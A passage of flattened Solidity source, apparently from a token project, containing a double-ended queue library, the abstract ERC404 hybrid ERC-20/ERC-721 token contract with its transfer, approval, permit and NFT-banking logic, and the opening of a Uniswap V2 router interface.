*\\n   * Struct members have an underscore prefix indicating that they are \\\"private\\\" and should not be read or written to\\n   * directly. Use the functions provided below instead. Modifying the struct manually may violate assumptions and\\n   * lead to unexpected behavior.\\n   *\\n   * The first item is at data[begin] and the last item is at data[end - 1]. This range can wrap around.\\n   */\\n  struct Uint256Deque {\\n    uint128 _begin;\\n    uint128 _end;\\n    mapping(uint128 index => uint256) _data;\\n  }\\n\\n  /**\\n   * @dev Inserts an item at the end of the queue.\\n   *\\n   * Reverts with {QueueFull} if the queue is full.\\n   */\\n  function pushBack(Uint256Deque storage deque, uint256 value) internal {\\n    unchecked {\\n      uint128 backIndex = deque._end;\\n      if (backIndex + 1 == deque._begin) revert QueueFull();\\n      deque._data[backIndex] = value;\\n      deque._end = backIndex + 1;\\n    }\\n  }\\n\\n  /**\\n   * @dev Removes the item at the end of the queue and returns it.\\n   *\\n   * Reverts with {QueueEmpty} if the queue is empty.\\n   */\\n  function popBack(\\n    Uint256Deque storage deque\\n  ) internal returns (uint256 value) {\\n    unchecked {\\n      uint128 backIndex = deque._end;\\n      if (backIndex == deque._begin) revert QueueEmpty();\\n      --backIndex;\\n      value = deque._data[backIndex];\\n      delete deque._data[backIndex];\\n      deque._end = backIndex;\\n    }\\n  }\\n\\n  /**\\n   * @dev Inserts an item at the beginning of the queue.\\n   *\\n   * Reverts with {QueueFull} if the queue is full.\\n   */\\n  function pushFront(Uint256Deque storage deque, uint256 value) internal {\\n    unchecked {\\n      uint128 frontIndex = deque._begin - 1;\\n      if (frontIndex == deque._end) revert QueueFull();\\n      deque._data[frontIndex] = value;\\n      deque._begin = frontIndex;\\n    }\\n  }\\n\\n  /**\\n   * @dev Removes the item at the beginning of the queue and returns it.\\n   *\\n   * Reverts with `QueueEmpty` if the queue is empty.\\n   */\\n  function popFront(\\n    Uint256Deque storage deque\\n  ) internal returns (uint256 value) {\\n    unchecked {\\n      uint128 frontIndex = deque._begin;\\n      if (frontIndex == deque._end) revert QueueEmpty();\\n      value = deque._data[frontIndex];\\n      delete deque._data[frontIndex];\\n      deque._begin = frontIndex + 1;\\n    }\\n  }\\n\\n  /**\\n   * @dev Returns the item at the beginning of the queue.\\n   *\\n   * Reverts with `QueueEmpty` if the queue is empty.\\n   */\\n  function front(\\n    Uint256Deque storage deque\\n  ) internal view returns (uint256 value) {\\n    if (empty(deque)) revert QueueEmpty();\\n    return deque._data[deque._begin];\\n  }\\n\\n  /**\\n   * @dev Returns the item at the end of the queue.\\n   *\\n   * Reverts with `QueueEmpty` if the queue is empty.\\n   */\\n  function back(\\n    Uint256Deque storage deque\\n  ) internal view returns (uint256 value) {\\n    if (empty(deque)) revert QueueEmpty();\\n    unchecked {\\n      return deque._data[deque._end - 1];\\n    }\\n  }\\n\\n  /**\\n   * @dev Return the item at a position in the queue given by `index`, with the first item at 0 and last item at\\n   * `length(deque) - 1`.\\n   *\\n   * Reverts with `QueueOutOfBounds` if the index is out of bounds.\\n   */\\n  function at(\\n    Uint256Deque storage deque,\\n    uint256 index\\n  ) internal view returns (uint256 value) {\\n    if (index >= length(deque)) revert QueueOutOfBounds();\\n    // By construction, length is a uint128, so the check above ensures that index can be safely downcast to uint128\\n    unchecked {\\n      return deque._data[deque._begin + uint128(index)];\\n    }\\n  }\\n\\n  /**\\n   * @dev Resets the queue back to being empty.\\n   *\\n   * NOTE: The current items are left behind in storage. This does not affect the functioning of the queue, but misses\\n   * out on potential gas refunds.\\n   */\\n  function clear(Uint256Deque storage deque) internal {\\n    deque._begin = 0;\\n    deque._end = 0;\\n  }\\n\\n  /**\\n   * @dev Returns the number of items in the queue.\\n   */\\n  function length(Uint256Deque storage deque) internal view returns (uint256) {\\n    unchecked {\\n      return uint256(deque._end - deque._begin);\\n    }\\n  }\\n\\n  /**\\n   * @dev Returns true if the queue is empty.\\n   */\\n  function empty(Uint256Deque storage deque) internal view returns (bool) {\\n    return deque._end == deque._begin;\\n  }\\n}\\n\\nlibrary ERC721Events {\\n  event ApprovalForAll(\\n    address indexed owner,\\n    address indexed operator,\\n    bool approved\\n  );\\n  event Approval(\\n    address indexed owner,\\n    address indexed spender,\\n    uint256 indexed id\\n  );\\n  event Transfer(address indexed from, address indexed to, uint256 indexed id);\\n}\\n\\nlibrary ERC20Events {\\n  event Approval(address indexed owner, address indexed spender, uint256 value);\\n  event Transfer(address indexed from, address indexed to, uint256 amount);\\n}\\n\\nabstract contract ERC404 is IERC404 {\\n  using DoubleEndedQueue for DoubleEndedQueue.Uint256Deque;\\n\\n  /// @dev The queue of ERC-721 tokens stored in the contract.\\n  DoubleEndedQueue.Uint256Deque private _storedERC721Ids;\\n\\n  /// @dev Token name\\n  string public name;\\n\\n  /// @dev Token symbol\\n  string public symbol;\\n\\n  /// @dev Decimals for ERC-20 representation\\n  uint8 public immutable decimals;\\n\\n  /// @dev Units for ERC-20 representation\\n  uint256 public immutable units;\\n\\n  /// @dev Total supply in ERC-20 representation\\n  uint256 public totalSupply;\\n\\n  /// @dev Current mint counter which also represents the highest\\n  ///      minted id, monotonically increasing to ensure accurate ownership\\n  uint256 public minted;\\n\\n  /// @dev Initial chain id for EIP-2612 support\\n  uint256 internal immutable _INITIAL_CHAIN_ID;\\n\\n  /// @dev Initial domain separator for EIP-2612 support\\n  bytes32 internal immutable _INITIAL_DOMAIN_SEPARATOR;\\n\\n  /// @dev Balance of user in ERC-20 representation\\n  mapping(address => uint256) public balanceOf;\\n\\n  /// @dev Allowance of user in ERC-20 representation\\n  mapping(address => mapping(address => uint256)) public allowance;\\n\\n  /// @dev Approval in ERC-721 representaion\\n  mapping(uint256 => address) public getApproved;\\n\\n  /// @dev Approval for all in ERC-721 representation\\n  mapping(address => mapping(address => bool)) public isApprovedForAll;\\n\\n  /// @dev Packed representation of ownerOf and owned indices\\n  mapping(uint256 => uint256) internal _ownedData;\\n\\n  /// @dev Array of owned ids in ERC-721 representation\\n  mapping(address => uint256[]) internal _owned;\\n\\n  /// @dev Addresses that are exempt from ERC-721 transfer, typically for gas savings (pairs, routers, etc)\\n  mapping(address => bool) internal _erc721TransferExempt;\\n\\n  /// @dev EIP-2612 nonces\\n  mapping(address => uint256) public nonces;\\n\\n  /// @dev Address bitmask for packed ownership data\\n  uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;\\n\\n  /// @dev Owned index bitmask for packed ownership data\\n  uint256 private constant _BITMASK_OWNED_INDEX = ((1 << 96) - 1) << 160;\\n\\n  /// @dev Constant for token id encoding\\n  uint256 public constant ID_ENCODING_PREFIX = 1 << 255;\\n\\n  constructor(string memory name_, string memory symbol_, uint8 decimals_) {\\n    name = name_;\\n    symbol = symbol_;\\n\\n    if (decimals_ < 18) {\\n      revert DecimalsTooLow();\\n    }\\n\\n    decimals = decimals_;\\n    units = 10 ** decimals;\\n\\n    // EIP-2612 initialization\\n    _INITIAL_CHAIN_ID = block.chainid;\\n    _INITIAL_DOMAIN_SEPARATOR = _computeDomainSeparator();\\n  }\\n\\n  /// @notice Function to find owner of a given ERC-721 token\\n  function ownerOf(\\n    uint256 id_\\n  ) public view virtual returns (address erc721Owner) {\\n    erc721Owner = _getOwnerOf(id_);\\n\\n    if (!_isValidTokenId(id_)) {\\n      revert InvalidTokenId();\\n    }\\n\\n    if (erc721Owner == address(0)) {\\n      revert NotFound();\\n    }\\n  }\\n\\n  function owned(\\n    address owner_\\n  ) public view virtual returns (uint256[] memory) {\\n    return _owned[owner_];\\n  }\\n\\n  function erc721BalanceOf(\\n    address owner_\\n  ) public view virtual returns (uint256) {\\n    return _owned[owner_].length;\\n  }\\n\\n  function erc20BalanceOf(\\n    address owner_\\n  ) public view virtual returns (uint256) {\\n    return balanceOf[owner_];\\n  }\\n\\n  function erc20TotalSupply() public view virtual returns (uint256) {\\n    return totalSupply;\\n  }\\n\\n  function erc721TotalSupply() public view virtual returns (uint256) {\\n    return minted;\\n  }\\n\\n  function getERC721QueueLength() public view virtual returns (uint256) {\\n    return _storedERC721Ids.length();\\n  }\\n\\n  function getERC721TokensInQueue(\\n    uint256 start_,\\n    uint256 count_\\n  ) public view virtual returns (uint256[] memory) {\\n    uint256[] memory tokensInQueue = new uint256[](count_);\\n\\n    for (uint256 i = start_; i < start_ + count_; ) {\\n      tokensInQueue[i - start_] = _storedERC721Ids.at(i);\\n\\n      unchecked {\\n        ++i;\\n      }\\n    }\\n\\n    return tokensInQueue;\\n  }\\n\\n  /// @notice tokenURI must be implemented by child contract\\n  function tokenURI(uint256 id_) public view virtual returns (string memory);\\n\\n  /// @notice Function for token approvals\\n  /// @dev This function assumes the operator is attempting to approve\\n  ///      an ERC-721 if valueOrId_ is a possibly valid ERC-721 token id.\\n  ///      Unlike setApprovalForAll, spender_ must be allowed to be 0x0 so\\n  ///      that approval can be revoked.\\n  function approve(\\n    address spender_,\\n    uint256 valueOrId_\\n  ) public virtual returns (bool) {\\n    if (_isValidTokenId(valueOrId_)) {\\n      erc721Approve(spender_, valueOrId_);\\n    } else {\\n      return erc20Approve(spender_, valueOrId_);\\n    }\\n\\n    return true;\\n  }\\n\\n  function erc721Approve(address spender_, uint256 id_) public virtual {\\n    // Intention is to approve as ERC-721 token (id).\\n    address erc721Owner = _getOwnerOf(id_);\\n\\n    if (\\n      msg.sender != erc721Owner && !isApprovedForAll[erc721Owner][msg.sender]\\n    ) {\\n      revert Unauthorized();\\n    }\\n\\n    getApproved[id_] = spender_;\\n\\n    emit ERC721Events.Approval(erc721Owner, spender_, id_);\\n  }\\n\\n  /// @dev Providing type(uint256).max for approval value results in an\\n  ///      unlimited approval that is not deducted from on transfers.\\n  function erc20Approve(\\n    address spender_,\\n    uint256 value_\\n  ) public virtual returns (bool) {\\n    // Prevent granting 0x0 an ERC-20 allowance.\\n    if (spender_ == address(0)) {\\n      revert InvalidSpender();\\n    }\\n\\n    allowance[msg.sender][spender_] = value_;\\n\\n    emit ERC20Events.Approval(msg.sender, spender_, value_);\\n\\n    return true;\\n  }\\n\\n  /// @notice Function for ERC-721 approvals\\n  function setApprovalForAll(address operator_, bool approved_) public virtual {\\n    // Prevent approvals to 0x0.\\n    if (operator_ == address(0)) {\\n      revert InvalidOperator();\\n    }\\n    isApprovedForAll[msg.sender][operator_] = approved_;\\n    emit ERC721Events.ApprovalForAll(msg.sender, operator_, approved_);\\n  }\\n\\n  /// @notice Function for mixed transfers from an operator that may be different than 'from'.\\n  /// @dev This function assumes the operator is attempting to transfer an ERC-721\\n  ///      if valueOrId is a possible valid token id.\\n  function transferFrom(\\n    address from_,\\n    address to_,\\n    uint256 valueOrId_\\n  ) public virtual returns (bool) {\\n    if (_isValidTokenId(valueOrId_)) {\\n      erc721TransferFrom(from_, to_, valueOrId_);\\n    } else {\\n      // Intention is to transfer as ERC-20 token (value).\\n      return erc20TransferFrom(from_, to_, valueOrId_);\\n    }\\n\\n    return true;\\n  }\\n\\n  /// @notice Function for ERC-721 transfers from.\\n  /// @dev This function is recommended for ERC721 transfers.\\n  function erc721TransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_\\n  ) public virtual {\\n    // Prevent minting tokens from 0x0.\\n    if (from_ == address(0)) {\\n      revert InvalidSender();\\n    }\\n\\n    // Prevent burning tokens to 0x0.\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    if (from_ != _getOwnerOf(id_)) {\\n      revert Unauthorized();\\n    }\\n\\n    // Check that the operator is either the sender or approved for the transfer.\\n    if (\\n      msg.sender != from_ &&\\n      !isApprovedForAll[from_][msg.sender] &&\\n      msg.sender != getApproved[id_]\\n    ) {\\n      revert Unauthorized();\\n    }\\n\\n    // We only need to check ERC-721 transfer exempt status for the recipient\\n    // since the sender being ERC-721 transfer exempt means they have already\\n    // had their ERC-721s stripped away during the rebalancing process.\\n    if (erc721TransferExempt(to_)) {\\n      revert RecipientIsERC721TransferExempt();\\n    }\\n\\n    // Transfer 1 * units ERC-20 and 1 ERC-721 token.\\n    // ERC-721 transfer exemptions handled above. Can't make it to this point if either is transfer exempt.\\n    _transferERC20(from_, to_, units);\\n    _transferERC721(from_, to_, id_);\\n  }\\n\\n  /// @notice Function for ERC-20 transfers from.\\n  /// @dev This function is recommended for ERC20 transfers\\n  function erc20TransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) public virtual returns (bool) {\\n    // Prevent minting tokens from 0x0.\\n    if (from_ == address(0)) {\\n      revert InvalidSender();\\n    }\\n\\n    // Prevent burning tokens to 0x0.\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    uint256 allowed = allowance[from_][msg.sender];\\n\\n    // Check that the operator has sufficient allowance.\\n    if (allowed != type(uint256).max) {\\n      allowance[from_][msg.sender] = allowed - value_;\\n    }\\n\\n    // Transferring ERC-20s directly requires the _transferERC20WithERC721 function.\\n    // Handles ERC-721 exemptions internally.\\n    return _transferERC20WithERC721(from_, to_, value_);\\n  }\\n\\n  /// @notice Function for ERC-20 transfers.\\n  /// @dev This function assumes the operator is attempting to transfer as ERC-20\\n  ///      given this function is only supported on the ERC-20 interface.\\n  ///      Treats even large amounts that are valid ERC-721 ids as ERC-20s.\\n  function transfer(address to_, uint256 value_) public virtual returns (bool) {\\n    // Prevent burning tokens to 0x0.\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    // Transferring ERC-20s directly requires the _transferERC20WithERC721 function.\\n    // Handles ERC-721 exemptions internally.\\n    return _transferERC20WithERC721(msg.sender, to_, value_);\\n  }\\n\\n  /// @notice Function for ERC-721 transfers with contract support.\\n  /// This function only supports moving valid ERC-721 ids, as it does not exist on the ERC-20\\n  /// spec and will revert otherwise.\\n  function safeTransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_\\n  ) public virtual {\\n    safeTransferFrom(from_, to_, id_, \\\"\\\");\\n  }\\n\\n  /// @notice Function for ERC-721 transfers with contract support and callback data.\\n  /// This function only supports moving valid ERC-721 ids, as it does not exist on the\\n  /// ERC-20 spec and will revert otherwise.\\n  function safeTransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_,\\n    bytes memory data_\\n  ) public virtual {\\n    if (!_isValidTokenId(id_)) {\\n      revert InvalidTokenId();\\n    }\\n\\n    transferFrom(from_, to_, id_);\\n\\n    if (\\n      to_.code.length != 0 &&\\n      IERC721Receiver(to_).onERC721Received(msg.sender, from_, id_, data_) !=\\n      IERC721Receiver.onERC721Received.selector\\n    ) {\\n      revert UnsafeRecipient();\\n    }\\n  }\\n\\n  /// @notice Function for EIP-2612 permits (ERC-20 only).\\n  /// @dev Providing type(uint256).max for permit value results in an\\n  ///      unlimited approval that is not deducted from on transfers.\\n  function permit(\\n    address owner_,\\n    address spender_,\\n    uint256 value_,\\n    uint256 deadline_,\\n    uint8 v_,\\n    bytes32 r_,\\n    bytes32 s_\\n  ) public virtual {\\n    if (deadline_ < block.timestamp) {\\n      revert PermitDeadlineExpired();\\n    }\\n\\n    // permit cannot be used for ERC-721 token approvals, so ensure\\n    // the value does not fall within the valid range of ERC-721 token ids.\\n    if (_isValidTokenId(value_)) {\\n      revert InvalidApproval();\\n    }\\n\\n    if (spender_ == address(0)) {\\n      revert InvalidSpender();\\n    }\\n\\n    unchecked {\\n      address recoveredAddress = ecrecover(\\n        keccak256(\\n          abi.encodePacked(\\n            \\\"\\\\x19\\\\x01\\\",\\n            DOMAIN_SEPARATOR(),\\n            keccak256(\\n              abi.encode(\\n                keccak256(\\n                  \\\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\\\"\\n                ),\\n                owner_,\\n                spender_,\\n                value_,\\n                nonces[owner_]++,\\n                deadline_\\n              )\\n            )\\n          )\\n        ),\\n        v_,\\n        r_,\\n        s_\\n      );\\n\\n      if (recoveredAddress == address(0) || recoveredAddress != owner_) {\\n        revert InvalidSigner();\\n      }\\n\\n      allowance[recoveredAddress][spender_] = value_;\\n    }\\n\\n    emit ERC20Events.Approval(owner_, spender_, value_);\\n  }\\n\\n  /// @notice Returns domain initial domain separator, or recomputes if chain id is not equal to initial chain id\\n  function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\\n    return\\n      block.chainid == _INITIAL_CHAIN_ID\\n        ? _INITIAL_DOMAIN_SEPARATOR\\n        : _computeDomainSeparator();\\n  }\\n\\n  function supportsInterface(\\n    bytes4 interfaceId\\n  ) public view virtual returns (bool) {\\n    return\\n      interfaceId == type(IERC404).interfaceId ||\\n      interfaceId == type(IERC165).interfaceId;\\n  }\\n\\n  /// @notice Function for self-exemption\\n  function setSelfERC721TransferExempt(bool state_) public virtual {\\n    _setERC721TransferExempt(msg.sender, state_);\\n  }\\n\\n  /// @notice Function to check if address is transfer exempt\\n  function erc721TransferExempt(\\n    address target_\\n  ) public view virtual returns (bool) {\\n    return target_ == address(0) || _erc721TransferExempt[target_];\\n  }\\n\\n  /// @notice For a token token id to be considered valid, it just needs\\n  ///         to fall within the range of possible token ids, it does not\\n  ///         necessarily have to be minted yet.\\n  function _isValidTokenId(uint256 id_) internal pure returns (bool) {\\n    return id_ > ID_ENCODING_PREFIX && id_ != type(uint256).max;\\n  }\\n\\n  /// @notice Internal function to compute domain separator for EIP-2612 permits\\n  function _computeDomainSeparator() internal view virtual returns (bytes32) {\\n    return\\n      keccak256(\\n        abi.encode(\\n          keccak256(\\n            \\\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\\\"\\n          ),\\n          keccak256(bytes(name)),\\n          keccak256(\\\"1\\\"),\\n          block.chainid,\\n          address(this)\\n        )\\n      );\\n  }\\n\\n  /// @notice This is the lowest level ERC-20 transfer function, which\\n  ///         should be used for both normal ERC-20 transfers as well as minting.\\n  /// Note that this function allows transfers to and from 0x0.\\n  function _transferERC20(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) internal virtual {\\n    // Minting is a special case for which we should not check the balance of\\n    // the sender, and we should increase the total supply.\\n    if (from_ == address(0)) {\\n      totalSupply += value_;\\n    } else {\\n      // Deduct value from sender's balance.\\n      balanceOf[from_] -= value_;\\n    }\\n\\n    // Update the recipient's balance.\\n    // Can be unchecked because on mint, adding to totalSupply is checked, and on transfer balance deduction is checked.\\n    unchecked {\\n      balanceOf[to_] += value_;\\n    }\\n\\n    emit ERC20Events.Transfer(from_, to_, value_);\\n  }\\n\\n  /// @notice Consolidated record keeping function for transferring ERC-721s.\\n  /// @dev Assign the token to the new owner, and remove from the old owner.\\n  /// Note that this function allows transfers to and from 0x0.\\n  /// Does not handle ERC-721 exemptions.\\n  function _transferERC721(\\n    address from_,\\n    address to_,\\n    uint256 id_\\n  ) internal virtual {\\n    // If this is not a mint, handle record keeping for transfer from previous owner.\\n    if (from_ != address(0)) {\\n      // On transfer of an NFT, any previous approval is reset.\\n      delete getApproved[id_];\\n\\n      uint256 updatedId = _owned[from_][_owned[from_].length - 1];\\n      if (updatedId != id_) {\\n        uint256 updatedIndex = _getOwnedIndex(id_);\\n        // update _owned for sender\\n        _owned[from_][updatedIndex] = updatedId;\\n        // update index for the moved id\\n        _setOwnedIndex(updatedId, updatedIndex);\\n      }\\n\\n      // pop\\n      _owned[from_].pop();\\n    }\\n\\n    // Check if this is a burn.\\n    if (to_ != address(0)) {\\n      // If not a burn, update the owner of the token to the new owner.\\n      // Update owner of the token to the new owner.\\n      _setOwnerOf(id_, to_);\\n      // Push token onto the new owner's stack.\\n      _owned[to_].push(id_);\\n      // Update index for new owner's stack.\\n      _setOwnedIndex(id_, _owned[to_].length - 1);\\n    } else {\\n      // If this is a burn, reset the owner of the token to 0x0 by deleting the token from _ownedData.\\n      delete _ownedData[id_];\\n    }\\n\\n    emit ERC721Events.Transfer(from_, to_, id_);\\n  }\\n\\n  /// @notice Internal function for ERC-20 transfers. Also handles any ERC-721 transfers that may be required.\\n  // Handles ERC-721 exemptions.\\n  function _transferERC20WithERC721(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) internal virtual returns (bool) {\\n    uint256 erc20BalanceOfSenderBefore = erc20BalanceOf(from_);\\n    uint256 erc20BalanceOfReceiverBefore = erc20BalanceOf(to_);\\n\\n    _transferERC20(from_, to_, value_);\\n\\n    // Preload for gas savings on branches\\n    bool isFromERC721TransferExempt = erc721TransferExempt(from_);\\n    bool isToERC721TransferExempt = erc721TransferExempt(to_);\\n\\n    // Skip _withdrawAndStoreERC721 and/or _retrieveOrMintERC721 for ERC-721 transfer exempt addresses\\n    // 1) to save gas\\n    // 2) because ERC-721 transfer exempt addresses won't always have/need ERC-721s corresponding to their ERC20s.\\n    if (isFromERC721TransferExempt && isToERC721TransferExempt) {\\n      // Case 1) Both sender and recipient are ERC-721 transfer exempt. No ERC-721s need to be transferred.\\n      // NOOP.\\n    } else if (isFromERC721TransferExempt) {\\n      // Case 2) The sender is ERC-721 transfer exempt, but the recipient is not. Contract should not attempt\\n      //         to transfer ERC-721s from the sender, but the recipient should receive ERC-721s\\n      //         from the bank/minted for any whole number increase in their balance.\\n      // Only cares about whole number increments.\\n      uint256 tokensToRetrieveOrMint = (balanceOf[to_] / units) -\\n        (erc20BalanceOfReceiverBefore / units);\\n      for (uint256 i = 0; i < tokensToRetrieveOrMint; ) {\\n        _retrieveOrMintERC721(to_);\\n        unchecked {\\n          ++i;\\n        }\\n      }\\n    } else if (isToERC721TransferExempt) {\\n      // Case 3) The sender is not ERC-721 transfer exempt, but the recipient is. Contract should attempt\\n      //         to withdraw and store ERC-721s from the sender, but the recipient should not\\n      //         receive ERC-721s from the bank/minted.\\n      // Only cares about whole number increments.\\n      uint256 tokensToWithdrawAndStore = (erc20BalanceOfSenderBefore / units) -\\n        (balanceOf[from_] / units);\\n      for (uint256 i = 0; i < tokensToWithdrawAndStore; ) {\\n        _withdrawAndStoreERC721(from_);\\n        unchecked {\\n          ++i;\\n        }\\n      }\\n    } else {\\n      // Case 4) Neither the sender nor the recipient are ERC-721 transfer exempt.\\n      // Strategy:\\n      // 1. First deal with the whole tokens. These are easy and will just be transferred.\\n      // 2. Look at the fractional part of the value:\\n      //   a) If it causes the sender to lose a whole token that was represented by an NFT due to a\\n      //      fractional part being transferred, withdraw and store an additional NFT from the sender.\\n      //   b) If it causes the receiver to gain a whole new token that should be represented by an NFT\\n      //      due to receiving a fractional part that completes a whole token, retrieve or mint an NFT to the recevier.\\n\\n      // Whole tokens worth of ERC-20s get transferred as ERC-721s without any burning/minting.\\n      uint256 nftsToTransfer = value_ / units;\\n      for (uint256 i = 0; i < nftsToTransfer; ) {\\n        // Pop from sender's ERC-721 stack and transfer them (LIFO)\\n        uint256 indexOfLastToken = _owned[from_].length - 1;\\n        uint256 tokenId = _owned[from_][indexOfLastToken];\\n        _transferERC721(from_, to_, tokenId);\\n        unchecked {\\n          ++i;\\n        }\\n      }\\n\\n      // If the transfer changes either the sender or the recipient's holdings from a fractional to a non-fractional\\n      // amount (or vice versa), adjust ERC-721s.\\n\\n      // First check if the send causes the sender to lose a whole token that was represented by an ERC-721\\n      // due to a fractional part being transferred.\\n      //\\n      // Process:\\n      // Take the difference between the whole number of tokens before and after the transfer for the sender.\\n      // If that difference is greater than the number of ERC-721s transferred (whole units), then there was\\n      // an additional ERC-721 lost due to the fractional portion of the transfer.\\n      // If this is a self-send and the before and after balances are equal (not always the case but often),\\n      // then no ERC-721s will be lost here.\\n      if (\\n        erc20BalanceOfSenderBefore / units - erc20BalanceOf(from_) / units >\\n        nftsToTransfer\\n      ) {\\n        _withdrawAndStoreERC721(from_);\\n      }\\n\\n      // Then, check if the transfer causes the receiver to gain a whole new token which requires gaining\\n      // an additional ERC-721.\\n      //\\n      // Process:\\n      // Take the difference between the whole number of tokens before and after the transfer for the recipient.\\n      // If that difference is greater than the number of ERC-721s transferred (whole units), then there was\\n      // an additional ERC-721 gained due to the fractional portion of the transfer.\\n      // Again, for self-sends where the before and after balances are equal, no ERC-721s will be gained here.\\n      if (\\n        erc20BalanceOf(to_) / units - erc20BalanceOfReceiverBefore / units >\\n        nftsToTransfer\\n      ) {\\n        _retrieveOrMintERC721(to_);\\n      }\\n    }\\n\\n    return true;\\n  }\\n\\n  /// @notice Internal function for ERC20 minting\\n  /// @dev This function will allow minting of new ERC20s.\\n  ///      If mintCorrespondingERC721s_ is true, and the recipient is not ERC-721 exempt, it will\\n  ///      also mint the corresponding ERC721s.\\n  /// Handles ERC-721 exemptions.\\n  function _mintERC20(address to_, uint256 value_) internal virtual {\\n    /// You cannot mint to the zero address (you can't mint and immediately burn in the same transfer).\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    if (totalSupply + value_ > ID_ENCODING_PREFIX) {\\n      revert MintLimitReached();\\n    }\\n\\n    _transferERC20WithERC721(address(0), to_, value_);\\n  }\\n\\n  /// @notice Internal function for ERC-721 minting and retrieval from the bank.\\n  /// @dev This function will allow minting of new ERC-721s up to the total fractional supply. It will\\n  ///      first try to pull from the bank, and if the bank is empty, it will mint a new token.\\n  /// Does not handle ERC-721 exemptions.\\n  function _retrieveOrMintERC721(address to_) internal virtual {\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    uint256 id;\\n\\n    if (!_storedERC721Ids.empty()) {\\n      // If there are any tokens in the bank, use those first.\\n      // Pop off the end of the queue (FIFO).\\n      id = _storedERC721Ids.popBack();\\n    } else {\\n      // Otherwise, mint a new token, should not be able to go over the total fractional supply.\\n      ++minted;\\n\\n      // Reserve max uint256 for approvals\\n      if (minted == type(uint256).max) {\\n        revert MintLimitReached();\\n      }\\n\\n      id = ID_ENCODING_PREFIX + minted;\\n    }\\n\\n    address erc721Owner = _getOwnerOf(id);\\n\\n    // The token should not already belong to anyone besides 0x0 or this contract.\\n    // If it does, something is wrong, as this should never happen.\\n    if (erc721Owner != address(0)) {\\n      revert AlreadyExists();\\n    }\\n\\n    // Transfer the token to the recipient, either transferring from the contract's bank or minting.\\n    // Does not handle ERC-721 exemptions.\\n    _transferERC721(erc721Owner, to_, id);\\n  }\\n\\n  /// @notice Internal function for ERC-721 deposits to bank (this contract).\\n  /// @dev This function will allow depositing of ERC-721s to the bank, which can be retrieved by future minters.\\n  // Does not handle ERC-721 exemptions.\\n  function _withdrawAndStoreERC721(address from_) internal virtual {\\n    if (from_ == address(0)) {\\n      revert InvalidSender();\\n    }\\n\\n    // Retrieve the latest token added to the owner's stack (LIFO).\\n    uint256 id = _owned[from_][_owned[from_].length - 1];\\n\\n    // Transfer to 0x0.\\n    // Does not handle ERC-721 exemptions.\\n    _transferERC721(from_, address(0), id);\\n\\n    // Record the token in the contract's bank queue.\\n    _storedERC721Ids.pushFront(id);\\n  }\\n\\n  /// @notice Initialization function to set pairs / etc, saving gas by avoiding mint / burn on unnecessary targets\\n  function _setERC721TransferExempt(\\n    address target_,\\n    bool state_\\n  ) internal virtual {\\n    if (target_ == address(0)) {\\n      revert InvalidExemption();\\n    }\\n\\n    // Adjust the ERC721 balances of the target to respect exemption rules.\\n    // Despite this logic, it is still recommended practice to exempt prior to the target\\n    // having an active balance.\\n    if (state_) {\\n      _clearERC721Balance(target_);\\n    } else {\\n      _reinstateERC721Balance(target_);\\n    }\\n\\n    _erc721TransferExempt[target_] = state_;\\n  }\\n\\n  /// @notice Function to reinstate balance on exemption removal\\n  function _reinstateERC721Balance(address target_) private {\\n    uint256 expectedERC721Balance = erc20BalanceOf(target_) / units;\\n    uint256 actualERC721Balance = erc721BalanceOf(target_);\\n\\n    for (uint256 i = 0; i < expectedERC721Balance - actualERC721Balance; ) {\\n      // Transfer ERC721 balance in from pool\\n      _retrieveOrMintERC721(target_);\\n      unchecked {\\n        ++i;\\n      }\\n    }\\n  }\\n\\n  /// @notice Function to clear balance on exemption inclusion\\n  function _clearERC721Balance(address target_) private {\\n    uint256 erc721Balance = erc721BalanceOf(target_);\\n\\n    for (uint256 i = 0; i < erc721Balance; ) {\\n      // Transfer out ERC721 balance\\n      _withdrawAndStoreERC721(target_);\\n      unchecked {\\n        ++i;\\n      }\\n    }\\n  }\\n\\n  function _getOwnerOf(\\n    uint256 id_\\n  ) internal view virtual returns (address ownerOf_) {\\n    uint256 data = _ownedData[id_];\\n\\n    assembly {\\n      ownerOf_ := and(data, _BITMASK_ADDRESS)\\n    }\\n  }\\n\\n  function _setOwnerOf(uint256 id_, address owner_) internal virtual {\\n    uint256 data = _ownedData[id_];\\n\\n    assembly {\\n      data := add(\\n        and(data, _BITMASK_OWNED_INDEX),\\n        and(owner_, _BITMASK_ADDRESS)\\n      )\\n    }\\n\\n    _ownedData[id_] = data;\\n  }\\n\\n  function _getOwnedIndex(\\n    uint256 id_\\n  ) internal view virtual returns (uint256 ownedIndex_) {\\n    uint256 data = _ownedData[id_];\\n\\n    assembly {\\n      ownedIndex_ := shr(160, data)\\n    }\\n  }\\n\\n  function _setOwnedIndex(uint256 id_, uint256 index_) internal virtual {\\n    uint256 data = _ownedData[id_];\\n\\n    if (index_ > _BITMASK_OWNED_INDEX >> 160) {\\n      revert OwnedIndexOverflow();\\n    }\\n\\n    assembly {\\n      data := add(\\n        and(data, _BITMASK_ADDRESS),\\n        and(shl(160, index_), _BITMASK_OWNED_INDEX)\\n      )\\n    }\\n\\n    _ownedData[id_] = data;\\n  }\\n}\\n\\ninterface IUniswapV2Router01 {\\n    function factory() external pure returns (address);\\n    function WETH() external pure returns (address);\\n\\n    function addLiquidity(\\n        address tokenA,\\n        address tokenB,\\n        uint amountADesired,\\n        uint amountBDesired,\\n        uint amountAMin,\\n        uint amountBMin,\\n        address to,\\n        uint deadline\\n    ) external returns (uint amountA, uint amountB, uint liquidity);\\n    function addLiquidityETH(\\n        address token,\\n        uint amountTokenDesired,\\n        uint amountTokenMin,\\n        uint amountETHMin,\\n        address to,\\n        uint deadline\\n    ) external payable returns (uint 